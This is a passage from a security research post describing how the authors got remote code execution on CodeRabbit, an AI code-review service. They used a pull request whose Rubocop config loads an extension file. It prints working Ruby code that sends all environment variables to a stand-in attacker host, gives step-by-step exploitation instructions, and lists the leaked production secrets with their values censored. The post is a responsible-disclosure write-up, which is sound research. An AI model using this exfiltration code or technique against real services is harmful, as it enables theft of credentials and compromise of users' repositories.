<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png"><img data-attachment-id="20093" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-145000_3457x598_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png" data-orig-size="3457,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-145000_3457x598_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=840" width="1024" height="177" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=1024" alt=""></a><figcaption>1 million repositories in review</figcaption></figure>



<p>Indeed, CodeRabbit is the most installed GitHub app in the AI Assisted category on GitHub Marketplace. It is also on the first page of the most installed GitHub apps overall across all categories on <a href="https://github.com/marketplace?type=apps">GitHub Marketplace</a>.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png"><img data-attachment-id="20810" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250721_14h36m44s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png" data-orig-size="3315,1526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250721_14h36m44s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=840" loading="lazy" width="1024" height="471" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit is the most installed AI-assisted app on GitHub marketplace</figcaption></figure>



<p>Once CodeRabbit is installed on a repository, every time a new pull request (PR) is created or updated, CodeRabbit will analyze the code changes in the PR and review them using AI. CodeRabbit will finally post its code review as a comment on the pull request, where the developer can read it.</p>



<p>This is a very useful developer productivity tool that can summarize PRs, find security issues in the code, suggest code improvements or even document the code or illustrate it by generating diagrams. It can save developers a lot of time.</p>



<h2>Trying out CodeRabbit</h2>



<p>CodeRabbit has multiple pricing plans, and one of them is called Pro. That one includes support for linters and SAST tools, such as Semgrep. Alternatively, there’s a free 14-day trial for the Pro plan. Also, the Pro plan comes for free for people working on open source projects.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png"><img data-attachment-id="20096" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-22-142418_1445x846_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png" data-orig-size="1445,846" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-22-142418_1445x846_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=840" loading="lazy" width="1024" height="599" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit pricing</figcaption></figure>



<p>I registered for the free trial and logged in using my GitHub account.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png"><img data-attachment-id="20116" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-21-100901_1363x1123_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png" data-orig-size="1363,1123" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-21-100901_1363x1123_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=840" loading="lazy" width="1024" height="843" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=1024" alt=""></a><figcaption>Login with GitHub</figcaption></figure></div>


<p>When first logging into CodeRabbit using GitHub, the application asks to install and authorize on a personal GitHub account. The user is asked to select which repositories CodeRabbit should be installed to. The user can also review the permissions that the CodeRabbit GitHub app will be granted. Namely, read and write access to code in the selected repositories.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png"><img data-attachment-id="20100" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-16-154845_655x833_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png" data-orig-size="655,833" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-16-154845_655x833_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=236" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" loading="lazy" width="655" height="833" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" alt=""></a><figcaption>Installing CodeRabbit on a personal GitHub account</figcaption></figure></div>


<p>At this point, this sounded very similar to what happened with Qodo Merge. I had to look into it. If somehow we could leak the GitHub API token, we would get read and write access to the repository in which CodeRabbit was installed.</p>



<p>I immediately created a private GitHub repository on my personal GitHub account and granted CodeRabbit access to that new repository so that it starts reviewing my PRs on that repo.</p>



<p>In order to get more familiar with CodeRabbit’s features and how to use them, I created a PR and saw that a comment containing a code review was posted by the CodeRabbit bot. Here are a few screenshots of what CodeRabbit generated.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png"><img data-attachment-id="20819" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m19s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png" data-orig-size="1270,462" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m19s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=840" loading="lazy" width="1024" height="372" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit explains what the PR does</figcaption></figure>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png"><img data-attachment-id="20823" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h06m52s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png" data-orig-size="1131,799" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h06m52s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=840" loading="lazy" width="1024" height="723" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit can find security issues in your code and suggest improvements</figcaption></figure>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png"><img data-attachment-id="20822" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m40s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png" data-orig-size="1119,672" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m40s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=840" loading="lazy" width="1024" height="614" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit even generated a diagram that explained how the app worked</figcaption></figure>



<p>Now that I had a better idea of how it worked, I could start looking for vulnerabilities. </p>



<h2>Exploiting external tools</h2>



<p>I had a look at the official CodeRabbit documentation and noticed that CodeRabbit supported running <a href="https://docs.coderabbit.ai/tools/">dozens of static analysis tools</a>. These are the linters and SAST tools mentioned on the CodeRabbit pricing page discussed above.</p>



<p>CodeRabbit runs these tools on your PR changes depending on a few conditions:</p>



<ul>
<li>The tool is enabled in the CodeRabbit configuration</li>



<li>The PR contains large enough changes to trigger a run of such tools. Small changes will be ignored and no tool will run on those</li>



<li>The PR contains files supported by the tool. For example, PHPStan will only run on files with the <code>.php</code> extension</li>
</ul>



<p>Some tools are enabled by default and will run if corresponding files exist. Otherwise, a <code>.coderabbit.yaml</code> file placed in the repository can be used to configure which tools should be enabled. Alternatively, the CodeRabbit web app settings can be used to configure tools.</p>



<p>The documentation page also states that each tool can be configured by providing a path to a configuration file read by the tool. Now we’re talking!</p>



<p>Since CodeRabbit executes these external tools, if any of these tools have a way to inject code, we may be able to run arbitrary code. So I glanced over the list of supported tools and found an interesting target: <a href="https://docs.coderabbit.ai/tools/rubocop">Rubocop</a>, a Ruby static analyzer. The CodeRabbit documentation page for Rubocop states that Rubocop will run on Ruby files (<code>.rb</code>) in the repository. It also says that CodeRabbit will look for a <code>.rubocop.yml</code> file anywhere in the repository and pass it to Rubocop.</p>


<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png"><img data-attachment-id="20802" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h56m36s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png" data-orig-size="807,210" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h56m36s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" loading="lazy" width="807" height="210" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" alt=""></a><figcaption>Rubocop runs on Ruby files (.rb)<br>Source: CodeRabbit documentation</figcaption></figure></div>

<div>
<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png"><img data-attachment-id="20805" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h31m50s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png" data-orig-size="867,239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h31m50s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=840" loading="lazy" width="867" height="239" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=867" alt=""></a><figcaption>CodeRabbit looks for Rubocop config files anywhere in the repository and, if found, passes it to Rubocop <br>Source: CodeRabbit documentation</figcaption></figure></div>


<p><br>Looking at Rubocop’s documentation, we see that it supports <a href="https://docs.rubocop.org/rubocop/1.69/extensions.html">extensions</a>. One can use the Rubocop configuration file to specify the path to an extension Ruby file, for example, <code>ext.rb</code>, which will be loaded and executed by Rubocop. To do so, one can include the following snippet in <code>.rubocop.yml</code>:</p>





<p>In <code>ext.rb</code>, we can write arbitrary Ruby code that will be loaded and executed when Rubocop runs. We’ll use 1.2.3.4 as an example IP address that stands in for an attacker-controlled system. For example, the following Ruby script will collect the environment variables and send them to an attacker-controlled server at <code>1.2.3.4</code>:</p>


<div><pre title="">require 'net/http'
require 'uri'
require 'json'

# Collect environment variables
env_vars = ENV.to_h

# Convert environment variables to JSON format
json_data = env_vars.to_json

# Define the URL to send the HTTP POST request
url = URI.parse('http://1.2.3.4/')

begin
  # Create the HTTP POST request
  http = Net::HTTP.new(url.host, url.port)
  request = Net::HTTP::Post.new(url.path)
  request['Content-Type'] = 'application/json'
  request.body = json_data

  # Send the request
  response = http.request(request)
rescue StandardError =&gt; e
  puts "An error occurred: #{e.message}"
end
</pre></div>


<p>Exploiting this is as simple as following these steps:</p>



<ul>
<li>Get a free trial on CodeRabbit and register using a personal GitHub account</li>



<li>Create a private repository and grant CodeRabbit access to it, so that it reviews PRs on that repository</li>



<li>Create a PR that contains the following files:
<ul>
<li>A <code>.rubocop.yml</code> file as shown above</li>



<li>An <code>ext.rb</code> file as shown above</li>



<li>Any other large enough dummy Ruby file so that CodeRabbit triggers the execution of Rubocop and does not skip the file</li>
</ul>
</li>



<li>Wait for CodeRabbit to perform the code review and run our malicious ext.rb file</li>



<li>Collect the exfiltrated environment variables in the HTTP POST request received on our attacker-controlled server at 1.2.3.4</li>
</ul>



<p>Here’s an illustration of our malicious pull request to better understand how it works:</p>



<article>


  <div>

    <!-- main.rb -->
    <div>
      <h3>main.rb</h3>
      <pre><span># Contains dummy </span>
<span># Ruby code so </span>
<span># that Rubocop </span>
<span># gets executed</span>

puts "hello"
      </pre>
    </div>

    <!-- .rubocop.yml -->
    <div>
      <h3>.rubocop.yml</h3>
      <pre><span># Instructs </span>
<span># Rubocop to load </span>
<span># extension in </span>
<span># file ext.rb</span>

require:
  ./ext.rb
      </pre>
    </div>

    <!-- ext.rb -->
    <div>
      <h3>ext.rb</h3>
      <pre><span># Malicious Ruby </span>
<span># code goes here</span>
<span># </span>
<span># Example:</span>
<span># </span>
<span># Send all env vars </span>
<span># to http://1.2.3.4</span>
      </pre>
    </div>

  </div>

  <!-- Legend -->
  <p>
    An illustration of what the malicious pull request looks like
  </p>
</article>



<h2>Unpacking what we found</h2>



<p>After we created our malicious PR, CodeRabbit ran Rubocop on our code, which executed our malicious code and sent its environment variables to our server at 1.2.3.4.</p>



<p>On the server at <code>1.2.3.4</code>, the following JSON payload containing environment variables was received:</p>


<div><pre title="">{
  "ANTHROPIC_API_KEYS": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_FREE": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_OSS": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_PAID": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_TRIAL": "sk-ant-api03-(CENSORED)",
  "APERTURE_AGENT_ADDRESS": "(CENSORED)",
  "APERTURE_AGENT_KEY": "(CENSORED)",
  "AST_GREP_ESSENTIALS": "ast-grep-essentials",
  "AST_GREP_RULES_PATH": "/home/jailuser/ast-grep-rules",
  "AWS_ACCESS_KEY_ID": "",
  "AWS_REGION": "",
  "AWS_SECRET_ACCESS_KEY": "",
  "AZURE_GPT4OMINI_DEPLOYMENT_NAME": "",
  "AZURE_GPT4O_DEPLOYMENT_NAME": "",
  "AZURE_GPT4TURBO_DEPLOYMENT_NAME": "",
  "AZURE_O1MINI_DEPLOYMENT_NAME": "",
  "AZURE_O1_DEPLOYMENT_NAME": "",
  "AZURE_OPENAI_API_KEY": "",
  "AZURE_OPENAI_ENDPOINT": "",
  "AZURE_OPENAI_ORG_ID": "",
  "AZURE_OPENAI_PROJECT_ID": "",
  "BITBUCKET_SERVER_BOT_TOKEN": "",
  "BITBUCKET_SERVER_BOT_USERNAME": "",
  "BITBUCKET_SERVER_URL": "",
  "BITBUCKET_SERVER_WEBHOOK_SECRET": "",
  "BUNDLER_ORIG_BUNDLER_VERSION": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_BUNDLE_BIN_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_BUNDLE_GEMFILE": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_GEM_HOME": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_GEM_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_MANPATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "BUNDLER_ORIG_RB_USER_INSTALL": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_RUBYLIB": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_RUBYOPT": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "CI": "true",
  "CLOUD_API_URL": "https://(CENSORED)",
  "CLOUD_RUN_TIMEOUT_SECONDS": "3600",
  "CODEBASE_VERIFICATION": "true",
  "CODERABBIT_API_KEY": "",
  "CODERABBIT_API_URL": "https://(CENSORED)",
  "COURIER_NOTIFICATION_AUTH_TOKEN": "(CENSORED)",
  "COURIER_NOTIFICATION_ID": "(CENSORED)",
  "DB_API_URL": " https://(CENSORED)",
  "ENABLE_APERTURE": "true",
  "ENABLE_DOCSTRINGS": "true",
  "ENABLE_EVAL": "false",
  "ENABLE_LEARNINGS": "",
  "ENABLE_METRICS": "",
  "ENCRYPTION_PASSWORD": "(CENSORED)",
  "ENCRYPTION_SALT": "(CENSORED)",
  "FIREBASE_DB_ID": "",
  "FREE_UPGRADE_UNTIL": "2025-01-15",
  "GH_WEBHOOK_SECRET": "(CENSORED)",
  "GITHUB_APP_CLIENT_ID": "(CENSORED)",
  "GITHUB_APP_CLIENT_SECRET": "(CENSORED)",
  "GITHUB_APP_ID": "(CENSORED)",
  "GITHUB_APP_NAME": "coderabbitai",
  "GITHUB_APP_PEM_FILE": "-----BEGIN RSA PRIVATE KEY-----\n(CENSORED)-\n-----END RSA PRIVATE KEY-----\n",
  "GITHUB_CONCURRENCY": "8",
  "GITHUB_ENV": "",
  "GITHUB_EVENT_NAME": "",
  "GITHUB_TOKEN": "",
  "GITLAB_BOT_TOKEN": "(CENSORED)",
  "GITLAB_CONCURRENCY": "8",
  "GITLAB_WEBHOOK_SECRET": "",
  "HOME": "/root",
  "ISSUE_PROCESSING_BATCH_SIZE": "30",
  "ISSUE_PROCESSING_START_DATE": "2023-06-01",
  "JAILUSER": "jailuser",
  "JAILUSER_HOME_PATH": "/home/jailuser",
  "JIRA_APP_ID": "(CENSORED)",
  "JIRA_APP_SECRET": "(CENSORED)",
  "JIRA_CLIENT_ID": "(CENSORED)",
  "JIRA_DEV_CLIENT_ID": "(CENSORED)",
  "JIRA_DEV_SECRET": "(CENSORED)",
  "JIRA_HOST": "",
  "JIRA_PAT": "",
  "JIRA_SECRET": "(CENSORED)",
  "JIRA_TOKEN_URL": "https://auth.atlassian.com/oauth/token",
  "K_CONFIGURATION": "pr-reviewer-saas",
  "K_REVISION": "pr-reviewer-saas-(CENSORED)",
  "K_SERVICE": "pr-reviewer-saas",
  "LANGCHAIN_API_KEY": "(CENSORED)",
  "LANGCHAIN_PROJECT": "default",
  "LANGCHAIN_TRACING_SAMPLING_RATE_CR": "50",
  "LANGCHAIN_TRACING_V2": "true",
  "LANGUAGETOOL_API_KEY": "(CENSORED)",
  "LANGUAGETOOL_USERNAME": "(CENSORED)",
  "LD_LIBRARY_PATH": "/usr/local/lib:/usr/lib:/lib:/usr/libexec/swift/5.10.1/usr/lib",
  "LINEAR_PAT": "",
  "LLM_PROVIDER": "",
  "LLM_TIMEOUT": "300000",
  "LOCAL": "false",
  "NODE_ENV": "production",
  "NODE_VERSION": "22.9.0",
  "NPM_CONFIG_REGISTRY": "http://(CENSORED)",
  "OAUTH2_CLIENT_ID": "",
  "OAUTH2_CLIENT_SECRET": "",
  "OAUTH2_ENDPOINT": "",
  "OPENAI_API_KEYS": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_FREE": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_OSS": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_PAID": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_TRIAL": "sk-proj-(CENSORED)",
  "OPENAI_BASE_URL": "",
  "OPENAI_ORG_ID": "",
  "OPENAI_PROJECT_ID": "",
  "PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "PINECONE_API_KEY": "(CENSORED)",
  "PINECONE_ENVIRONMENT": "us-central1-gcp",
  "PNPM_HOME": "/pnpm",
  "PORT": "8080",
  "POSTGRESQL_DATABASE": "(CENSORED)",
  "POSTGRESQL_HOST": "(CENSORED)",
  "POSTGRESQL_PASSWORD": "(CENSORED)",
  "POSTGRESQL_USER": "(CENSORED)",
  "PWD": "/inmem/21/d277c149-9d6a-4dde-88cc-03f724b50e2d/home/jailuser/git",
  "REVIEW_EVERYTHING": "false",
  "ROOT_COLLECTION": "",
  "SELF_HOSTED": "",
  "SELF_HOSTED_KNOWLEDGE_BASE": "",
  "SELF_HOSTED_KNOWLEDGE_BASE_BRANCH": "",
  "SENTRY_DSN": "https://(CENSORED)",
  "SERVICE_NAME": "pr-reviewer-saas",
  "SHLVL": "0",
  "TELEMETRY_COLLECTOR_URL": "https://(CENSORED)",
  "TEMP_PATH": "/inmem",
  "TINI_VERSION": "v0.19.0",
  "TRPC_API_BASE_URL": "https://(CENSORED)",
  "VECTOR_COLLECTION": "",
  "YARN_VERSION": "1.22.22",
  "_": "/usr/local/bin/rubocop"
}
</pre></div>


<p>That payload contained so many secrets that it actually took me a few minutes to grasp what we had gotten access to. The environment variables contained, notably:</p>



<ul>
<li>Anthropic API keys (free, oss, paid, trial, etc.)</li>



<li>OpenAI API keys (free, oss, paid, trial, etc.)</li>



<li>Aperture agent key</li>



<li>Courier auth token</li>



<li>Encryption password and salt</li>



<li>Gitlab personal access token</li>



<li>CodeRabbit GitHub App private key, app client id, app client secret, app id</li>



<li>Jira secret</li>



<li>Langchain/langsmith API key</li>



<li>LanguageTool API key</li>



<li>Pinecone API key</li>



<li>PostgreSQL database host, username and password</li>
</ul>



<p>Leaking environment variables is one thing, but since we obtained remote code execution (RCE) on that server, there is even more that an attacker could have done. Indeed, they could connect to the Postgres database server on the internal network. They could perform destructive operations. They could likely obtain the source code of the CodeRabbit app itself which is potentially somewhere in the Docker container where the external tool runs.</p>



<p>Before exploring the leaked environment variables further, we performed a few minimal reconnaissance operations, such as listing a few directories and reading the contents of a couple files on the production system, just to confirm the impacts. But this process was not really efficient and we were not able to quickly confirm the presence of the original source code of the CodeRabbit webapp there. However, the built application was there in the <code>/app/pr-reviewer-saas/dist</code> directory.<br>Additionally, since this was a production server, we didn’t want to do anything that could disrupt the CodeRabbit service and decided to stop there.<br>But there was more. Let’s go back to the exfiltrated environment variables.</p>



<h2>Getting Read/write access to 1M repositories</h2>



